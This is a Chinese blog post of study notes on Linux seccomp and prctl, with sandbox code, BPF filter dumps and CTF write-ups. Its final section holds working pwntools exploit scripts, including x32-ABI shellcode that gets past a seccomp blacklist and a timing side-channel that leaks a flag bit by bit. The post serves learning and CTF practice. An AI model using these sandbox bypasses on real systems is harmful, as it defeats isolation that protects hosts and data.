# seccomp                                

## What is seccomp

> seccomp (short for secure computing mode) is a computer security  facility in the Linux kernel. It was merged into the Linux kernel  mainline in kernel version 2.6.12, which was released on March 8, 2005.  seccomp allows a process to make a one-way transition into a “secure”  state where it cannot make any system calls except exit(), sigreturn(),  read() and write() to already-open file descriptors. Should it attempt  any other system calls, the kernel will terminate the process with  SIGKILL or SIGSYS. In this sense, it does not virtualize the system’s  resources but isolates the process from them entirely.

用自己的话来说,就是说seccomp是一种内核中的安全机制,正常情况下,程序可以使用所有的syscall,这是不安全的,比如劫持程序流后通过execve的syscall来getshell.通过seccomp我们可以在程序中禁用掉某些syscall,这样就算劫持了程序流也只能调用部分的syscall了.

## How to use

首先,调用seccomp的程序我们是能够直接运行的,但是我们不能直接编写调用seccomp的程序,因为我们缺少相应的头文件.通过apt安装

```

sudo apt install libseccomp-dev libseccomp2 seccomp
```

这样应该就有头文件了

```

# veritas @ ubuntu in /usr/include
$ find . -name seccomp.h
./seccomp.h
./linux/seccomp.h
```

先写一个简单的程序调用一下syscall,简单的输出后,会弹一个shell

```

//gcc -g simple_syscall.c -o simple_syscall
#include <unistd.h>

int main(void){
	char * filename = "/bin/sh";
	char * argv[] = {"/bin/sh",NULL};
	char * envp[] = {NULL};
	write(1,"i will give you a shell\n",24);
	syscall(59,filename,argv,envp);//execve
	return 0;
}
```

现在我们通过seccomp禁用掉execve的syscall.

```

//gcc -g simple_syscall_seccomp.c -o simple_syscall_seccomp -lseccomp
#include <unistd.h>
#include <seccomp.h>
#include <linux/seccomp.h>

int main(void){
	scmp_filter_ctx ctx;
	ctx = seccomp_init(SCMP_ACT_ALLOW);
	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
	seccomp_load(ctx);

	char * filename = "/bin/sh";
	char * argv[] = {"/bin/sh",NULL};
	char * envp[] = {NULL};
	write(1,"i will give you a shell\n",24);
	syscall(59,filename,argv,envp);//execve
	return 0;
}
```

运行结果:

```

# veritas @ ubuntu in ~/test/seccomp
$ ./simple_syscall_seccomp 
i will give you a shell
[1]    14024 invalid system call (core dumped)  ./simple_syscall_seccomp
```

稍微解释一下上面几个函数

`ctx`是`Filter context/handle`,其中`typedef void *scmp_filter_ctx;`
`seccomp_init`是初始化的过滤状态,这里用的是`SCMP_ACT_ALLOW`,表示默认允许所有的syscacll.如果初始化状态为`SCMP_ACT_KILL`,则表示默认不允许所有的syscall

```

/*
 * seccomp actions
 */

/**
 * Kill the process
 */
#define SCMP_ACT_KILL		0x00000000U
/**
 * Throw a SIGSYS signal
 */
#define SCMP_ACT_TRAP		0x00030000U
/**
 * Return the specified error code
 */
#define SCMP_ACT_ERRNO(x)	(0x00050000U | ((x) & 0x0000ffffU))
/**
 * Notify a tracing process with the specified value
 */
#define SCMP_ACT_TRACE(x)	(0x7ff00000U | ((x) & 0x0000ffffU))
/**
 * Allow the syscall to be executed after the action has been logged
 */
#define SCMP_ACT_LOG		0x7ffc0000U
/**
 * Allow the syscall to be executed
 */
#define SCMP_ACT_ALLOW		0x7fff0000U
```

`seccomp_rule_add`是添加一条规则,函数原形如下

```

/**
 * Add a new rule to the filter
 * @param ctx the filter context
 * @param action the filter action
 * @param syscall the syscall number
 * @param arg_cnt the number of argument filters in the argument filter chain
 * @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended)
 *
 * This function adds a series of new argument/value checks to the seccomp
 * filter for the given syscall; multiple argument/value checks can be
 * specified and they will be chained together (AND'd together) in the filter.
 * If the specified rule needs to be adjusted due to architecture specifics it
 * will be adjusted without notification.  Returns zero on success, negative
 * values on failure.
 *
 */
int seccomp_rule_add(scmp_filter_ctx ctx,
		     uint32_t action, int syscall, unsigned int arg_cnt, ...);
```

`seccomp_load`是应用过滤,如果不调用`seccomp_load`则上面所有的过滤都不会生效

```

/**
 * Loads the filter into the kernel
 * @param ctx the filter context
 *
 * This function loads the given seccomp filter context into the kernel.  If
 * the filter was loaded correctly, the kernel will be enforcing the filter
 * when this function returns.  Returns zero on success, negative values on
 * error.
 *
 */
int seccomp_load(const scmp_filter_ctx ctx);
```



有一点需要再说一下,我们用的是`seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);`,`arg_cnt`为0,表示我们直接限制execve,不管他什么参数.

如果`arg_cnt`不为0,那`arg_cnt`表示后面限制的参数的个数,也就是只有调用execve,且参数满足要求时,才会拦截syscall.

```

/**
 * Specify an argument comparison struct for use in declaring rules
 * @param arg the argument number, starting at 0
 * @param op the comparison operator, e.g. SCMP_CMP_*
 * @param datum_a dependent on comparison
 * @param datum_b dependent on comparison, optional
 */
#define SCMP_CMP(...)		((struct scmp_arg_cmp){__VA_ARGS__})

/**
 * Specify an argument comparison struct for argument 0
 */
#define SCMP_A0(...)		SCMP_CMP(0, __VA_ARGS__)

/**
 * Specify an argument comparison struct for argument 1
 */
#define SCMP_A1(...)		SCMP_CMP(1, __VA_ARGS__)

/**
 * Specify an argument comparison struct for argument 2
 */
#define SCMP_A2(...)		SCMP_CMP(2, __VA_ARGS__)

/**
 * Specify an argument comparison struct for argument 3
 */
#define SCMP_A3(...)		SCMP_CMP(3, __VA_ARGS__)

/**
 * Specify an argument comparison struct for argument 4
 */
#define SCMP_A4(...)		SCMP_CMP(4, __VA_ARGS__)

/**
 * Specify an argument comparison struct for argument 5
 */
#define SCMP_A5(...)		SCMP_CMP(5, __VA_ARGS__)



/**
 * Comparison operators
 */
enum scmp_compare {
	_SCMP_CMP_MIN = 0,
	SCMP_CMP_NE = 1,		/**< not equal */
	SCMP_CMP_LT = 2,		/**< less than */
	SCMP_CMP_LE = 3,		/**< less than or equal */
	SCMP_CMP_EQ = 4,		/**< equal */
	SCMP_CMP_GE = 5,		/**< greater than or equal */
	SCMP_CMP_GT = 6,		/**< greater than */
	SCMP_CMP_MASKED_EQ = 7,		/**< masked equality */
	_SCMP_CMP_MAX,
};

/**
 * Argument datum
 */
typedef uint64_t scmp_datum_t;

/**
 * Argument / Value comparison definition
 */
struct scmp_arg_cmp {
	unsigned int arg;	/**< argument number, starting at 0 */
	enum scmp_compare op;	/**< the comparison op, e.g. SCMP_CMP_* */
	scmp_datum_t datum_a;
	scmp_datum_t datum_b;
};
```

举几个栗子

比如我要只拦截哪些length等于0x10的write系统调用,可以这样写:

```

#include <unistd.h>
#include <seccomp.h>
#include <linux/seccomp.h>

int main(void){
	scmp_filter_ctx ctx;
	ctx = seccomp_init(SCMP_ACT_ALLOW);
	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write),1,SCMP_A2(SCMP_CMP_EQ,0x10));//第2(从0)个参数等于0x10
	seccomp_load(ctx);
	write(1,"i will give you a shell\n",24);//不被拦截
	write(1,"1234567812345678",0x10);//被拦截
	return 0;
}
```



除了seccomp,还有一个叫`prctl`的函数也能做到类似的效果

函数原形

```

#include <sys/prctl.h>

int prctl(int option, unsigned long arg2, unsigned long arg3,
          unsigned long arg4, unsigned long arg5);
```



当option为`PR_SET_NO_NEW_PRIVS`(38),且arg2为1时,将无法获得特权

```

PR_SET_NO_NEW_PRIVS (since Linux 3.5)
    Set the calling process's no_new_privs bit to the value in arg2.
    With no_new_privs set to 1,  execve(2)  promises  not  to  grant
    privileges  to do anything that could not have been done without
    the execve(2) call (for example, rendering the  set-user-ID  and
    set-group-ID  mode  bits, and file capabilities non-functional).
    Once set, this bit cannot be unset.  The setting of this bit  is
    inherited  by  children  created  by  fork(2)  and clone(2), and
    preserved across execve(2).
    
    For   more   information,   see   the   kernel    source    file
    Documentation/prctl/no_new_privs.txt.
```



例子:

```

#include <unistd.h>
#include <sys/prctl.h>

int main(void){
	prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);

	char * filename = "/bin/sh";
	char * argv[] = {"/bin/sh",NULL};
	char * envp[] = {NULL};
	write(1,"i will give you a shell\n",24);
	syscall(59,filename,argv,envp);//execve
	return 0;
}
```

运行效果

```

# veritas @ ubuntu in ~/test/seccomp
$ ./prctl_test                  
i will give you a shell
$ sudo sh
sudo: effective uid is not 0, is sudo installed setuid root?
$ whoami
veritas
$ id
uid=1000(veritas) gid=1000(veritas) groups=1000(veritas),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ sudo
sudo: effective uid is not 0, is sudo installed setuid root?
$
```

当option为`PR_SET_SECCOMP`(22)时,效果就是我们上面的seccomp了,只不过这里的格式略有不同

```

PR_SET_SECCOMP (since Linux 2.6.23)
   Set the secure computing (seccomp) mode for the calling  thread,
   to limit the available system calls.  The more recent seccomp(2)
   system  call  provides  a  superset  of  the  functionality   of
   PR_SET_SECCOMP.

   The  seccomp  mode is selected via arg2.  (The seccomp constants
   are defined in <linux/seccomp.h>.)

   With arg2 set to SECCOMP_MODE_STRICT, the only system calls that
   the  thread is permitted to make are read(2), write(2), _exit(2)
   (but not exit_group(2)), and sigreturn(2).  Other  system  calls
   result  in  the  delivery  of  a  SIGKILL signal.  Strict secure
   computing mode is useful for number-crunching applications  that
   may  need  to  execute  untrusted byte code, perhaps obtained by
   reading from a pipe or socket.  This operation is available only
   if the kernel is configured with CONFIG_SECCOMP enabled.

   With  arg2  set  to  SECCOMP_MODE_FILTER  (since Linux 3.5), the
   system calls allowed are defined by  a  pointer  to  a  Berkeley
   Packet  Filter  passed  in  arg3.  This argument is a pointer to
   struct sock_fprog; it can be designed to filter arbitrary system
   calls and system call arguments.  This mode is available only if
   the kernel is configured with CONFIG_SECCOMP_FILTER enabled.

   If SECCOMP_MODE_FILTER filters permit fork(2), then the  seccomp
   mode  is  inherited by children created by fork(2); if execve(2)
   is  permitted,  then  the  seccomp  mode  is  preserved   across
   execve(2).  If the filters permit prctl() calls, then additional
   filters can be added; they are run in order until the first non-
   allow result is seen.

   For   further   information,   see   the   kernel   source  file
   Documentation/prctl/seccomp_filter.txt.
```

解释一下,如果arg2为`SECCOMP_MODE_STRICT`(1),则只允许调用read,write,_exit(not exit_group),sigreturn这几个syscall.如果arg2为`SECCOMP_MODE_FILTER`(2),则为过滤模式,其中对syscall的限制通过arg3用BPF(Berkeley Packet Filter)的形式传进来,是指向struct sock_fprog数组的指针.

```

/*
 *	Try and keep these values and structures similar to BSD, especially
 *	the BPF code definitions which need to match so you can share filters
 */
 
struct sock_filter {	/* Filter block */
	__u16	code;   /* Actual filter code */
	__u8	jt;	/* Jump true */
	__u8	jf;	/* Jump false */
	__u32	k;      /* Generic multiuse field */
};
struct sock_fprog {	/* Required for SO_ATTACH_FILTER. */
	unsigned short		len;	/* Number of filter blocks */
	struct sock_filter *filter;
};
```

这里可以看到部分解释https://eigenstate.org/notes/seccomp

使用例子
我们可以把之前`simple_syscall_seccomp`中的seccomp改为prctl试试

首先,有一个叫`seccomp_export_bpf`的函数能够将设置的seccomp以bpf的形式导出,我们稍稍修改simple_syscall_seccomp.c

```

//gcc -g simple_syscall_seccomp.c -o simple_syscall_seccomp -lseccomp
#include <unistd.h>
#include <seccomp.h>
#include <linux/seccomp.h>
#include <fcntl.h>
int main(void){

	scmp_filter_ctx ctx;
	ctx = seccomp_init(SCMP_ACT_ALLOW);
	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write),1,SCMP_A2(SCMP_CMP_EQ,0x10));
	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),0);
	seccomp_load(ctx);

	int fd = open("bpf.out",O_WRONLY);
	seccomp_export_bpf(ctx,fd);
	close(fd);


	char * filename = "/bin/sh";
	char * argv[] = {"/bin/sh",NULL};
	char * envp[] = {NULL};
	write(1,"i will give you a shell\n",24);
	write(1,"1234567812345678",0x10);
	syscall(0x4000003b,filename,argv,envp);//execve
	return 0;
}
```

从而得到了bpf

```

# veritas @ ubuntu in ~/test/seccomp
$ hexdump bpf.out
0000000 0020 0000 0004 0000 0015 0900 003e c000
0000010 0020 0000 0000 0000 0035 0007 0000 4000
0000020 0015 0006 003b 0000 0015 0400 0001 0000
0000030 0020 0000 0024 0000 0015 0200 0000 0000
0000040 0020 0000 0020 0000 0015 0001 0010 0000
0000050 0006 0000 0000 7fff 0006 0000 0000 0000
0000060
```

改用prctl:

```

#include <unistd.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>

int main(void){
	
	prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
	struct sock_filter sfi[] = {
		{0x20,0x00,0x00,0x00000004},
		{0x15,0x00,0x09,0xc000003e},
		{0x20,0x00,0x00,0x00000000},
		{0x35,0x07,0x00,0x40000000},
		{0x15,0x06,0x00,0x0000003b},
		{0x15,0x00,0x04,0x00000001},
		{0x20,0x00,0x00,0x00000024},
		{0x15,0x00,0x02,0x00000000},
		{0x20,0x00,0x00,0x00000020},
		{0x15,0x01,0x00,0x00000010},
		{0x06,0x00,0x00,0x7fff0000},
		{0x06,0x00,0x00,0x00000000}
	};
	struct sock_fprog sfp = {12,sfi};

	prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&sfp);
	
	char * filename = "/bin/sh";
	char * argv[] = {"/bin/sh",NULL};
	char * envp[] = {NULL};
	write(1,"i will give you a shell\n",24);
	write(1,"1234567812345678",0x10);
	syscall(0x4000003b,filename,argv,envp);//execve
	return 0;
}
```

成功拦截

```

# veritas @ ubuntu in ~/test/seccomp
$ ./prctl_test            
i will give you a shell
[1]    20120 invalid system call (core dumped)  ./prctl_test
```

## How to reverse

可以使用现成的工具,感谢大佬们的开发orz
https://github.com/david942j/seccomp-tools

使用例子,seccomp和prctl都能用

```

# veritas @ ubuntu in ~/test/seccomp
$ seccomp-tools dump ./simple_syscall_seccomp
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x07 0x00 0x40000000  if (A >= 0x40000000) goto 0011
 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011
 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010
 0006: 0x20 0x00 0x00 0x00000024  A = args[2] >> 32
 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010
 0008: 0x20 0x00 0x00 0x00000020  A = args[2]
 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 
# veritas @ ubuntu in ~/test/seccomp
$ seccomp-tools dump ./prctl_test            
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x07 0x00 0x40000000  if (A >= 0x40000000) goto 0011
 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011
 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010
 0006: 0x20 0x00 0x00 0x00000024  A = args[2] >> 32
 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010
 0008: 0x20 0x00 0x00 0x00000020  A = args[2]
 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```



我们去测测之前的一些题目吧

- **pwnable.tw orw**

```

unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h]
  char *v2; // [esp+8h] [ebp-80h]
  char v3; // [esp+Ch] [ebp-7Ch]
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(&v3, stru_8048640, 0x60u);
  v1 = 12;                                      // 参数个数
  v2 = &v3;
  prctl(38, 1, 0, 0, 0);                        // prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)
  prctl(22, 2, &v1);                            // prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER)
  return __readgsdword(0x14u) ^ v4;
}

.rodata:08048640 ; sock_filter stru_8048640[12]
.rodata:08048640 stru_8048640    sock_filter <20h, 0, 0, 4>
.rodata:08048640                                         ; DATA XREF: orw_seccomp+17↑o
.rodata:08048648                 sock_filter <15h, 0, 9, 40000003h>
.rodata:08048650                 sock_filter <20h, 0, 0, 0>
.rodata:08048658                 sock_filter <15h, 7, 0, 0ADh>
.rodata:08048660                 sock_filter <15h, 6, 0, 77h>
.rodata:08048668                 sock_filter <15h, 5, 0, 0FCh>
.rodata:08048670                 sock_filter <15h, 4, 0, 1>
.rodata:08048678                 sock_filter <15h, 3, 0, 5>
.rodata:08048680                 sock_filter <15h, 2, 0, 3>
.rodata:08048688                 sock_filter <15h, 1, 0, 4>
.rodata:08048690                 sock_filter <6, 0, 0, 50026h>
.rodata:08048698                 sock_filter <6, 0, 0, 7FFF0000h>
```

用seccomp-tools得到以下结果

```

$ seccomp-tools dump ./orw.bin               
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

在i386下,只允许了write,read,open,exit,exit_group,sigreturn,rt_sigreturn

所以这题没法用execve拿shell

- **0ctf misc mathgame**

```

$ seccomp-tools dump ./subtraction
Starting system, please wait...
System started!
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0x40000003  if (A == ARCH_I386) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x000000ad  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000077  if (A != sigreturn) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x000000fc  if (A != exit_group) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000001  if (A != exit) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000005  if (A != open) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000003  if (A != read) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000004  if (A != write) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x000000c5  if (A != fstat64) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x00000036  if (A != ioctl) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x0000008c  if (A != _llseek) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x15 0x00 0x01 0x000000c0  if (A != mmap2) goto 0026
 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0026: 0x15 0x00 0x01 0x0000005b  if (A != munmap) goto 0028
 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0028: 0x15 0x00 0x01 0x0000002d  if (A != brk) goto 0030
 0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0030: 0x06 0x00 0x00 0x00000000  return KILL
```

也就是只允许了上面能看到的那些syscall

- **qwb2018 xx_game**

```

$ seccomp-tools dump "./dec.pwn 4091897731" 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x19 0xc000003e  if (A != ARCH_X86_64) goto 0027
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x17 0x00 0x40000000  if (A >= 0x40000000) goto 0027
 0004: 0x15 0x15 0x00 0x00000000  if (A == read) goto 0026
 0005: 0x15 0x14 0x00 0x00000002  if (A == open) goto 0026
 0006: 0x15 0x13 0x00 0x00000003  if (A == close) goto 0026
 0007: 0x15 0x12 0x00 0x00000005  if (A == fstat) goto 0026
 0008: 0x15 0x11 0x00 0x0000000c  if (A == brk) goto 0026
 0009: 0x15 0x10 0x00 0x0000000f  if (A == rt_sigreturn) goto 0026
 0010: 0x15 0x0f 0x00 0x0000003c  if (A == exit) goto 0026
 0011: 0x15 0x0e 0x00 0x000000e7  if (A == exit_group) goto 0026
 0012: 0x15 0x00 0x0e 0x00000001  if (A != write) goto 0027
 0013: 0x20 0x00 0x00 0x00000014  A = args[0] >> 32
 0014: 0x15 0x00 0x0c 0x00000000  if (A != 0x0) goto 0027
 0015: 0x20 0x00 0x00 0x00000010  A = args[0]
 0016: 0x15 0x09 0x00 0x00000002  if (A == 0x2) goto 0026
 0017: 0x15 0x00 0x09 0x00000001  if (A != 0x1) goto 0027
 0018: 0x20 0x00 0x00 0x0000001c  A = args[1] >> 32
 0019: 0x15 0x00 0x07 0x00000000  if (A != 0x0) goto 0027
 0020: 0x20 0x00 0x00 0x00000018  A = args[1]
 0021: 0x15 0x00 0x05 0x00602100  if (A != 0x602100) goto 0027
 0022: 0x20 0x00 0x00 0x00000024  A = args[2] >> 32
 0023: 0x35 0x00 0x02 0x00000000  if (A < 0x0) goto 0026
 0024: 0x20 0x00 0x00 0x00000020  A = args[2]
 0025: 0x25 0x01 0x00 0x00000080  if (A > 0x80) goto 0027
 0026: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0027: 0x06 0x00 0x00 0x00000000  return KILL
```

这下就清楚了,允许read,open,close,fstat,brk,rt_sigreturn,exit,exit_group

其中write是有参数限制的,不满足条件就kill,而条件是第一个参数只能为1或2,第二个参数只能为0x602100,第三个参数的高4位小于0x80.

## Some challenge

在学习的过程中,我还找到了一些以seccomp为主体的题目,不得不佩服

- **2015 baby playpen fence**

Link: https://github.com/yvrctf/2015/blob/master/babyplaypenfence/README.md

首先用ida看了一遍,构造合理的输入,触发`prctl_seccomp`得到保护信息

```

$ sudo seccomp-tools dump -c "./babypf < stdin"

   ______
  | |__| |  WELCOME TO THE
  |  ()  |  UNTRUSTED COMPUTING SERVICE
  |______|  V0.0.1a

LOAD PROGRAM
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006
 0005: 0x06 0x00 0x00 0x00050016  return ERRNO(22)
 0006: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0008
 0007: 0x06 0x00 0x00 0x00050016  return ERRNO(22)
 0008: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0010
 0009: 0x06 0x00 0x00 0x00050016  return ERRNO(22)
 0010: 0x15 0x00 0x01 0x00000130  if (A != open_by_handle_at) goto 0012
 0011: 0x06 0x00 0x00 0x00050016  return ERRNO(22)
 0012: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0014
 0013: 0x06 0x00 0x00 0x00050016  return ERRNO(22)
 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

只禁用了open,mmap,openat, open_by_handle_at和ptrace

第一反应:那为啥不直接用execve???

```

$ python exp.py                                
[+] Starting local process './babypf': pid 23036
[*] Switching to interactive mode
[*] Process './babypf' stopped with exit code 0 (pid 23036)
sh: error while loading shared libraries: libc.so.6: cannot open shared object file: Invalid argument
THANK YOU
[*] Got EOF while reading in interactive
$
```

果然是我太年轻了

wp上说Since 3.4 the Linux kernel has had a feature called the X32 ABI; 64bit syscalls with 32bit pointers.

看了一下`/usr/include/x86_64-linux-gnu/asm/unistd_x32.h`

内容如下

```

#ifndef _ASM_X86_UNISTD_X32_H
#define _ASM_X86_UNISTD_X32_H 1

#define __NR_read (__X32_SYSCALL_BIT + 0)
#define __NR_write (__X32_SYSCALL_BIT + 1)
#define __NR_open (__X32_SYSCALL_BIT + 2)
#define __NR_close (__X32_SYSCALL_BIT + 3)
#define __NR_stat (__X32_SYSCALL_BIT + 4)
#define __NR_fstat (__X32_SYSCALL_BIT + 5)
#define __NR_lstat (__X32_SYSCALL_BIT + 6)
#define __NR_poll (__X32_SYSCALL_BIT + 7)
#define __NR_lseek (__X32_SYSCALL_BIT + 8)
#define __NR_mmap (__X32_SYSCALL_BIT + 9)
#define __NR_mprotect (__X32_SYSCALL_BIT + 10)
......
```

而`__X32_SYSCALL_BIT`为`0x40000000`

构造shellcode读出flag

```

#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context.arch = 'amd64'
local = 1

if local:
	cn = process('./babypf')
	bin = ELF('./babypf',checksec=False)
	#libc = ELF('',checksec=False)
else:
	#cn = remote('')
	pass


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


cn.recvuntil('LOAD PROGRAM\n')

sc = '''
    push 0x1010101 ^ 0x7478
    xor dword ptr [rsp], 0x1010101
    mov rax, 0x742e67616c662f2e
    push rax
	mov rdi, rsp
	xor edx, edx /* 0 */
	xor esi, esi /* 0 */
	mov rax,0x40000002
	syscall

	mov rdi, rax
	sub rsp, 0x1000
	lea rsi, [rsp]
	mov rdx, 0x1000
	mov rax, 0x40000000
	syscall

	mov rdi, 1
	mov rdx, rax
	mov rax, 0x40000001
	syscall

	mov rax, 0x4000003c
	xor rdi, rdi
	syscall
'''
sc = asm(sc)
cn.send(p32(len(sc)))
sleep(0.2)
cn.send(sc)

cn.interactive()
```

- **2015 big prison fence**

Link: https://github.com/yvrctf/2015/blob/master/bigprisonfence/README.md

这次程序的保护为

```

prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT, 0, 0, 0);
```

第一个似乎会使我们gdb调试崩溃
第三个限制我们只能使用read, write, _exit(but not exit_group), sigreturn.

但由于程序一开始就把flag读进程序了,因此我们只要想办法把他leak出来就行

可惜程序关闭了0~1024的fd,因此考虑写延时shellcode,1bit 1bit来leak.

```

#coding=utf8
from pwn import *
#context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def bf(nbyte,nbit):
	cn = process('./bigpf_y')

	#z('b*0x56555ECB\nc')
	cn.recvuntil('NAME PROGRAM\n')
	cn.sendline('asdfasdfasdf')
	cn.recvuntil('LOAD PROGRAM\n')
	sc = '''
		/*edi -> flag*/
		add edi,%d /* n byte */
		xor edx,edx
		mov dl,byte ptr [edi]
		shr dl,%d /* n bit */
		and dl,1

		test edx,edx
		jz loop
		xor ebx,ebx
		mov eax,1
		int 0x80 /* exit */
	loop:
		jmp loop
	''' %(nbyte,nbit)
	sc = asm(sc)

	cn.send(p32(len(sc)))
	cn.send(sc)
	sleep(0.01)
	try:
		cn.send('test')
		cn.recv(timeout=0.01)
	except:
		cn.close()
		return 1

	cn.close()
	return 0

out=''
for i in range(0x100): # byte
	ch=''
	for j in range(8):
		ch = str(bf(i,j))+ch
		success(ch)
	intt=int(ch,2)
	if(intt == 0):
		success(out)
		exit(0)
	out+=chr(intt)
```

- **HITCON 2017 Seccomp**

见其他大佬的wp

https://blukat29.github.io/2017/11/hitcon-quals-2017-seccomp/

> The BPF instructions operate on the BPF virtual machine, which has  four main elements: The accumulator register A, the index register X,  the packet memory, and the scratch memory M[].

## Reference

- http://www.outflux.net/teach-seccomp/
- http://www.outflux.net/teach-seccomp/autodetect.html
- https://eigenstate.org/notes/seccomp
- https://dangokyo.me/2018/05/01/seccomp-and-ptrace/
- http://manpages.ubuntu.com/manpages/xenial/en/man2/prctl.2.html
- http://manpages.ubuntu.com/manpages/xenial/en/man2/seccomp.2.html
- http://manpages.ubuntu.com/manpages/xenial/en/man3/seccomp_rule_add.3.html
- http://manpages.ubuntu.com/manpages/xenial/en/man3/seccomp_load.3.html
- http://manpages.ubuntu.com/manpages/xenial/en/man3/seccomp_export_bpf.3.html
- https://www.wikiwand.com/en/Seccomp
- https://www.kernel.org/doc/Documentation/prctl/no_new_privs.txt
- https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt

- ​    **Post author:**  Veritas501
- ​    **Post link:**     https://veritas501.github.io/2018/05/05/seccomp学习笔记/  
- ​    **Copyright Notice:**  All articles in this blog are licensed under [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) unless stating additionally.